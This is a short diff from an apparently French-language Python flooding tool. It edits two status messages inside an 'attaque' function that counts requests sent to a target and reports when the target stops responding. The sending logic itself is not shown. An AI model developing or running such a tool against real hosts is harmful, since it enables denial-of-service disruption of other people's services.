@@ -46,11 +46,11 @@ def attaque():
 
             compteur += 1
 
-            print(f"{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {compteur} {Fore.LIGHTBLACK_EX}requêtes envoyées avec succès à {target}".format(compteur, target))
+            print(f"{Fore.WHITE}[ {Fore.GREEN}+ {Fore.WHITE}] {compteur} {Fore.LIGHTBLACK_EX}requêtes envoyées avec succès à '{target}' !".format(compteur, target))
 
             s.close
         except socket.error:
-            print(f"{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Connexion impossible! {target} ne répond plus.")
+            print(f"{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Connexion impossible! '{target}' ne répond plus.")
             socket.close
             break
 
